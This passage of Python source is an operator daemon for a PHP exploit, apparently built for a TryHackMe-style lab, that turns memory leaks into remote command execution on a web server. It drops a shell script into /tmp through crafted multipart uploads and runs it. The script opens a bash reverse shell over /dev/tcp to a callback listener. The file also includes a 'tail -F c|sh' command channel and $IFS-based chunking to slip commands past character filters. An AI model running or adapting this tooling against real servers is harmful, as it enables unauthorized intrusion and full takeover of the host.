                    parts2.append({"name": f"a{i:030d}"[:31], "data": ht})
            else:
                for i in range(15):
                    parts2.append({"name": f"a{i:030d}"[:31], "data": ht})
                for i in range(2):
                    parts2.append({"name": f"f{i:02d}", "data": ref})

            boundary = b"T" * 10
            body = ex.build_multipart(parts2, boundary)
            hdr = (
                f"POST {self.t.path} HTTP/1.1\r\n"
                f"Host: {self.t.host}:{self.t.port}\r\n"
                f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
                f"Content-Length: {len(body)}\r\n"
                "Connection: close\r\n\r\n"
            ).encode()
            s = self.t._connect()
            s.settimeout(3600.0)
            try:
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            except OSError:
                pass

            def reader() -> None:
                try:
                    while not self.stream_stop.is_set():
                        chunk = s.recv(65536)
                        if not chunk:
                            break
                        self.shell_data(chunk)
                except OSError:
                    pass
                self.shell_status("closed", "tail stream ended")

            th = threading.Thread(target=reader, daemon=True)
            th.start()
            try:
                s.sendall(hdr)
                mv = memoryview(body)
                for off in range(0, len(body), 262144):
                    s.sendall(mv[off:off + 262144])
            except OSError:
                pass
            th.join(timeout=3600.0)
        except (OSError, ValueError) as e:
            self.shell_status("error", str(e))

    def tail_append(self, line: str) -> None:
        """Append one command line to `c`. Spaces become $IFS; the line must
        be free of |;&<>()`'\" (the transport chunks are plain shell words)."""
        safe = line.replace(" ", "$IFS")
        if any(ch in BAD_CHARS for ch in safe):
            raise ValueError("tail mode: command contains forbidden chars "
                             "|;&<>()`'\\\" - use a shorter fetch command or tmpdrop mode")
        if not safe:
            return
        self.shell_status("chunk", f"appending {len(safe)} chars to {TAIL_NAME}")
        if len(safe) <= ECHO_BUDGET:
            self.fresh_worker()
            self.run_stage3(f"echo {safe}>>{TAIL_NAME}")
            return
        head, tail = safe[:-ECHO_BUDGET], safe[-ECHO_BUDGET:]
        for i in range(0, len(head), PRINTF_BUDGET):
            ch = head[i:i + PRINTF_BUDGET]
            if "%" in ch:
                raise ValueError("tail mode: '%' must not split across chunks; "
                                 "reword the command")
            self.fresh_worker()
            self.run_stage3(f"printf {ch}>>{TAIL_NAME}")
        self.fresh_worker()
        self.run_stage3(f"echo {tail}>>{TAIL_NAME}")

    def exec_tail(self, cmd: str) -> bytes:
        self.tail_append(cmd)
        return b""  # output arrives asynchronously on the tail stream

    # ---- mode: tmpdrop / reverse shell ----

    def _rev_listener(self, port: int) -> None:
        try:
            ls = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            ls.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            ls.bind(("0.0.0.0", port))
            ls.listen(4)
            self.listen_sock = ls
        except OSError as e:
            self.shell_status("error", f"cannot bind callback port {port}: {e}")
            return
        while not self.stream_stop.is_set():
            try:
                ls.settimeout(1.0)
                conn, addr = ls.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            with self.revlock:
                if self.revsock is not None:
                    try:
                        self.revsock.close()
                    except OSError:
                        pass
                self.revsock = conn
            self.log(f"[+] reverse shell connected from {addr[0]}:{addr[1]}")
            self.shell_status("connected", f"reverse shell from {addr[0]}:{addr[1]}")

    def _rev_reader(self, conn: socket.socket) -> None:
        try:
            while not self.stream_stop.is_set():
                data = conn.recv(65536)
                if not data:
                    break
                self.shell_data(data)
        except OSError:
            pass
        self.shell_status("closed", "reverse shell disconnected")
        with self.revlock:
            if self.revsock is conn:
                self.revsock = None

    def _upload_script(self, script: bytes) -> None:
        """Crash-request that leaves the script behind in /tmp/phpXXXXXX."""
        self.log("[*] dropping script via multipart temp file")
        parts = [{"name": f"f{i:04d}"[:5], "data": b"V" * 3000} for i in range(1001)]
        parts += [
            {"name": "PHPSESSID", "data": b"\x00"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            {"name": "f", "filename": "s.sh", "data": script},
            self.x._big_field(),
        ]
        self.t.post(ex.build_multipart(parts, b"S" * 17), b"S" * 17,
                    read_cap=1 << 20, timeout=max(90.0, self.t.timeout))
        time.sleep(0.3)
        parts = [
            {"name": "PHPSESSID", "data": ex.SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        self.t.post(ex.build_multipart(parts, b"BNDRY12345"), b"BNDRY12345",
                    read_cap=65536, timeout=20.0)
        time.sleep(0.5)

    def open_tmpdrop(self, params: dict) -> dict:
        ip = self.detect_callback_ip()
        port = int(params.get("callback_port") or self.cfg.get("callback_port") or 4444)
        script = (
            "#!/bin/sh\n"
            "for f in /tmp/php*; do [ \"$f\" != \"$0\" ] && rm -f \"$f\"; done\n"
            f"while :; do bash -c 'exec bash -i &>/dev/tcp/{ip}/{port}' && break; sleep 3; done\n"
        ).encode()
        self.log(f"[*] tmpdrop: reverse shell -> {ip}:{port}")
        self.shell_status("listening", f"callback {ip}:{port}")
        threading.Thread(target=self._rev_listener, args=(port,), daemon=True).start()

        deadline = time.time() + 300.0
        attempt = 0
        while time.time() < deadline and not self.shell_open:
            attempt += 1
            self.log(f"[*] tmpdrop attempt {attempt}: clean /tmp, drop, trigger")
            try:
                self.fresh_worker()
                self.run_stage3("rm -f /tmp/p*")        # exactly 14 bytes
                self._upload_script(script)
                self.fresh_worker()
                self.run_stage3("sh</tmp/p*")           # glob redirect, 11 bytes
            except (OSError, ValueError) as e:
                self.log(f"[-] tmpdrop attempt error: {e}", "warn")
            for _ in range(15):
                if self.shell_open or self.stream_stop.is_set():
                    break
                time.sleep(1.0)
            if self.revsock is not None:
                break
        if self.revsock is None:
            self.shell_status("error", "no callback within timeout")
            return {"ok": False, "error": "TMPDROP_FAILED"}
        conn = self.revsock
        threading.Thread(target=self._rev_reader, args=(conn,), daemon=True).start()
        self.shell_open = True
        self.mode = "tmpdrop"
        self.state_event()
        return {"ok": True, "mode": "tmpdrop"}

    # ---- mode dispatcher ----

    def open_tail(self) -> dict:
        self.shell_status("opening", "starting tail -F c|sh in a fresh worker")
        self.stream_stop.clear()
        threading.Thread(target=self._tail_stream_loop, daemon=True).start()
        # verify the channel with `id`
        time.sleep(1.0)
        try:
            self.tail_append("id")
        except (OSError, ValueError) as e:
            self.shell_status("error", str(e))
            return {"ok": False, "error": str(e)}
        self.shell_open = True
        self.mode = "tail"
        self.state_event()
        self.shell_status("open", "tail channel open - output streams below")
        return {"ok": True, "mode": "tail"}

    def op_open_shell(self, params: dict) -> dict:
        if self.cfg.get("mock"):
            self.shell_open = True
            self.mode = params.get("mode") or "resp"
            self.state_event()
            self.shell_data(b"mock: shell channel open (" + self.mode.encode() + b")\n")
            return {"ok": True, "mode": self.mode, "mock": True}
        if not (self.chunk and self.libphp):
            return {"ok": False, "error": "leaks not ready; run pwn first"}
        want = (params.get("mode") or self.mode or "resp")
        if want == "tmpdrop":
            return self.open_tmpdrop(params)
        if want == "tail":
            return self.open_tail()
        # resp / fetch need no persistent channel
        self.shell_open = True
        self.mode = want
        self.state_event()
        self.shell_status("open", f"{want} mode: type commands, ~10-40s each")
        return {"ok": True, "mode": want}

    def op_exec(self, params: dict) -> dict:
        cmd = (params.get("cmd") or "").strip()
        if not cmd:
            return {"ok": False, "error": "empty command"}
        if self.cfg.get("mock"):
            time.sleep(0.3)
            out = self._mock_exec(cmd)
            self.shell_data(out)
            return {"ok": True, "mock": True}
        if not (self.chunk and self.libphp):
            return {"ok": False, "error": "leaks not ready; run pwn first"}
        mode = params.get("mode") or self.mode or "resp"
        self.log(f"[*] exec [{mode}]: {cmd!r}")
        try:
            if mode == "resp":
                out = self.exec_resp(cmd)
            elif mode == "fetch":
                out = self.exec_fetch(cmd)
            elif mode == "tail":
                out = self.exec_tail(cmd)
            else:
                return {"ok": False, "error": f"unknown mode {mode}"}
        except (OSError, ValueError, RuntimeError) as e:
            self.log(f"[-] exec failed: {e}", "warn")
            return {"ok": False, "error": str(e)}
        if out:
            self.shell_data(out)
        return {"ok": True, "bytes": len(out)}

    def op_shell_input(self, params: dict) -> dict:
        data = base64.b64decode(params.get("data") or "")
        if self.cfg.get("mock"):
            self.shell_data(b"mock-echo: " + data)
            return {"ok": True}
        with self.revlock:
            conn = self.revsock
        if conn is None:
            return {"ok": False, "error": "no interactive shell connected"}
        try:
            conn.sendall(data)
        except OSError as e:
            return {"ok": False, "error": str(e)}
        return {"ok": True}

    def op_kill_shell(self, _params: dict) -> dict:
        self.stream_stop.set()
        with self.revlock:
            if self.revsock:
                try:
                    self.revsock.close()
                except OSError:
                    pass
                self.revsock = None
            if self.listen_sock:
                try:
                    self.listen_sock.close()
                except OSError:
                    pass
                self.listen_sock = None
        if not self.cfg.get("mock") and self.chunk and self.libphp:
            try:
                self.fresh_worker()
                self.run_stage3(f"pkill tail;rm -f {TAIL_NAME} {FETCH_NAME}"[:14])
            except (OSError, ValueError):
                pass
        self.shell_open = False
        self.mode = None
        self.state_event()
        return {"ok": True}

    def op_raw(self, params: dict) -> dict:
        """Run the author's exploit.py CLI verbatim and stream its output."""
        args = params.get("args") or []
        cmd = [sys.executable, os.path.join(_HERE, "exploit.py")] + [str(a) for a in args]
        self.log(f"[*] raw: {' '.join(cmd[2:])}")
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                    text=True, bufsize=1)
        except OSError as e:
            return {"ok": False, "error": str(e)}

        def pump() -> None:
            assert proc.stdout
            for line in proc.stdout:
                self.log(line.rstrip(), "raw")

        th = threading.Thread(target=pump, daemon=True)
        th.start()
        code = proc.wait(timeout=1200)
        th.join(timeout=5)
        return {"ok": code == 0, "exit": code}

    def _mock_exec(self, cmd: str) -> bytes:
        table = {
            "id": b"uid=33(www-data) gid=33(www-data) groups=33(www-data)\n",
            "whoami": b"www-data\n",
            "uname -a": (b"Linux thm-php2shell 6.1.0-37-amd64 #1 SMP PREEMPT_DYNAMIC "
                         b"Debian 6.1.140-1 (2025-11-20) x86_64 GNU/Linux\n"),
            "env": (b"APACHE_RUN_DIR=/var/run/apache2\n"
                    b"PHP_VERSION=8.4.26\nHOSTNAME=thm-target\nHOME=/var/www\n"),
        }
        if cmd in table:
            return table[cmd]
        if cmd.startswith("ls"):
            return (b"total 24\ndrwxr-xr-x 1 root root 4096 Oct 22 10:00 .\n"
                    b"-rwxr-xr-x 1 root root   47 Oct 22 10:00 index.php\n"
                    b"-rw-r--r-- 1 www-data www-data   39 Oct 22 10:12 o\n")
        if cmd.startswith("cat /flag") or cmd.startswith("cat$IFS/flag"):
            return b"THM{php2shell_mock_flag_2026}\n"
        if cmd.startswith("cat " + FETCH_NAME) or cmd == "cat o":
            return self.last_output_file or b"uid=33(www-data) gid=33(www-data)\n"
        return b"mock: executed '" + cmd.encode() + b"'\n"

    def op_snapshot(self, _params: dict) -> dict:
        # NOTE: kept flat - dispatch() already wraps this in {"type":"result","data":...}
        return {
            "ok": True,
            "state": self.state_label(),
            "mode": self.mode,
            "modes": self.modes,
            "leaks": {
                "chunk": f"0x{self.chunk:x}" if self.chunk else None,
                "libphp": f"0x{self.libphp:x}" if self.libphp else None,
                "htdata": f"0x{self.htdata():x}" if self.htdata() else None,
                "zif": f"0x{self.zif():x}" if self.zif() else None,
            },
            "stages": dict(self.stages),
            "shell_status": getattr(self, "last_shell_status", None),
            "logs": list(self.logs)[-400:],
            "url": self.cfg.get("url"),
            "mock": bool(self.cfg.get("mock")),
        }

    def state_label(self) -> str:
        return ("shell" if self.shell_open else
                "ready" if (self.chunk and self.libphp) else
                "error" if self.cfg.get("failed") else "idle")

    # ---------------- dispatch loop ----------------

    def dispatch(self, req: dict) -> None:
        rid = str(req.get("id", ""))
        op = req.get("op", "")
        params = req.get("params") or {}
        handler = {
            "config": self.op_config,
            "pwn": self.op_pwn,
            "probe": self.op_probe,
            "open_shell": self.op_open_shell,
            "exec": self.op_exec,
            "shell_input": self.op_shell_input,
            "kill_shell": self.op_kill_shell,
            "raw": self.op_raw,
            "snapshot": self.op_snapshot,
        }.get(op)
        if handler is None:
            self.ev.emit({"type": "result", "id": rid, "ok": False,
                          "error": f"unknown op {op}"})
            return
        try:
            with self.lock:
                data = handler(params)
        except Exception as e:  # noqa: BLE001 - agent must never die
            self.ev.emit({"type": "result", "id": rid, "ok": False,
                          "error": f"{type(e).__name__}: {e}"})
            return
        ok = bool(data.get("ok")) if isinstance(data, dict) else True
        # surface the real reason: failures carry their message in data["error"]
        err = None
        if not ok and isinstance(data, dict):
            err = str(data.get("error") or "failed")
        self.ev.emit({"type": "result", "id": rid, "ok": ok,
                      "data": data, "error": err})


def _serve(port: int) -> None:
    """Daemon mode: TCP JSON-lines server; state (leaks, shell) lives here."""
    ev = Emitter()
    agent = ShellAgent(ev)
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("127.0.0.1", port))
    srv.listen(16)
    agent.log(f"[*] agent daemon listening on 127.0.0.1:{port}")

    def client_loop(sock: socket.socket, peer: str) -> None:
        buf = ""
        sock.settimeout(None)
        try:
            while True:
                try:
                    chunk = sock.recv(65536)
                except OSError:
                    break
                if not chunk:
                    break
                buf += chunk.decode("utf-8", "replace")
                while "\n" in buf:
                    line, buf = buf.split("\n", 1)
                    line = line.strip()
                    if not line:
                        continue
                    try:
                        req = json.loads(line)
                    except json.JSONDecodeError:
                        continue
                    threading.Thread(target=agent.dispatch, args=(req,),
                                     daemon=True).start()
        finally:
            ev.remove(sock)
            try:
                sock.close()
            except OSError:
                pass

    while True:
        try:
            sock, addr = srv.accept()
        except OSError:
            # e.g. transient EMFILE/EINTR - never let the accept loop kill the daemon
            time.sleep(0.05)
            continue
        ev.add(sock, f"{addr[0]}:{addr[1]}")
        threading.Thread(target=client_loop, args=(sock, f"{addr[0]}:{addr[1]}"),
                         daemon=True).start()


def main() -> int:
    if "--serve" in sys.argv:
        port = int(os.environ.get("P2S_AGENT_PORT", "47017"))
        if len(sys.argv) > sys.argv.index("--serve") + 1:
            port = int(sys.argv[sys.argv.index("--serve") + 1])
        _serve(port)
        return 0
    ev = Emitter()
    agent = ShellAgent(ev)
    ev.emit({"type": "log", "level": "info", "msg": "[*] agent up (stdio mode), waiting for config"})
    for line in sys.stdin:
        line = line.strip()
        if not line:
            continue
        try:
            req = json.loads(line)
        except json.JSONDecodeError:
            ev.emit({"type": "log", "level": "warn", "msg": f"bad json: {line[:80]}"})
            continue
        threading.Thread(target=agent.dispatch, args=(req,), daemon=True).start()
    return 0


if __name__ == "__main__":
    sys.exit(main())
